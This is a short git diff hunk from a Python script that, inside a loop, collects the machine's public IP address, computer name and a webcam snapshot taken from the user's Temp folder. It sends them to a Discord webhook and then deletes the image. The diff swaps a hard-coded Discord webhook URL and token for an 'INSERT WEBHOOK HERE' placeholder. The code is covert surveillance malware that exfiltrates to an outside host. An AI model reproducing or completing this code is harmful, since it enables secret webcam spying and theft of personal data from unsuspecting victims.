@@ -24,7 +24,7 @@ while(True):
     ip = get('https://api.ipify.org').content.decode('utf8')
     pcName = environ['COMPUTERNAME']
     currentTime = datetime.now().strftime("%d.%m. - %H:%M:%S")
-    hook = Webhook("https://discord.com/api/webhooks/902185555272532008/z42slGeHQlx4WInZo9gJC4OgxRX4nUs4j1JyXQg4n6HCQamFujVvsF_DX-y7ALtZ7OLh")
+    hook = Webhook("your discord webhook")#INSERT WEBHOOK HERE
     cameraImage = File(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
     hook.send("```\nPC NAME: "+ pcName +"\nIP: "+ format(ip)+"\n"+ currentTime + "```", file=cameraImage)
     remove(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
